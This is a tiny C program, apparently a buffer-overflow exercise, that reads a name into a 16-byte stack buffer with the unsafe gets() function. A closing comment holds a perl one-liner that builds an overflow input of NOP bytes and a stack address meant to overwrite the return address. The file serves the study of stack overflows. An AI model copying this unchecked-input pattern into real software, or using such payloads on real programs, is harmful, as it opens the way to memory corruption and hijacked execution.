#include <stdio.h>
int main( int argc, char** argv ) {
	char buffer[16];
	printf("Enter your name:  ");
	gets(buffer);
	printf("Hello %s!\n", buffer);
	return 0;
}

//perl -e 'print "\x90"x24 . "\x10\xdd\xff\xff" . "\xff\x7f";' > /tmp/input

